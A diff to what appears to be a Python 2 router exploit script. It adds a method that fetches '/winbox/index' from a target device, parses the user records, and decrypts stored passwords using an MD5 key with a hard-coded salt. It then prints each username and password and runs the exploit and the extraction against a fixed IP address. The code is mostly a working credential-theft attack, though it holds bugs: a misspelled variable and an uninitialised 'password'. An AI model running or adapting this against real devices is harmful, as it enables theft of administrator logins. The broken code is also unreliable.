@@ -63,4 +63,27 @@ class Vuln():
 			s2.close()
 		else:
 			print "How can I attack a target that is not vulnerable?"
+	def extract_login(self):
+		self.results=[]
+
+		req=requests.get("http://%s:%s/winbox/index"%(self.ip,self.port))
+		userdata=req.content
+		user_pass_pairs=userdata.split(b"M2")[1:]
+		for i in user_pass_pairs:
+			usrdata=i.split(b"\x01\x00\x00\x21")[1]
+			pwddata=i.split(b"\x11\x00\x00\x21")[1]
+
+			username=usrdata[1:1+ord(usrdta[0])]
+			pwdenc=pwddata[1:1+ord(pwddata[0])]
+
+			pwkey=hashlib.md5(username + b"283i4jfkai3389").digest()
+
+			for i in range(len(pwdenc)):
+				password+=chr(ord(pwdenc[i])^ord(pwkey[i%len(pwkey)]))
+
+			print username,password
+			self.results.append([username,password])
+
 router=Vuln('20.20.20.237')
+router.exploit()
+router.extract_login()
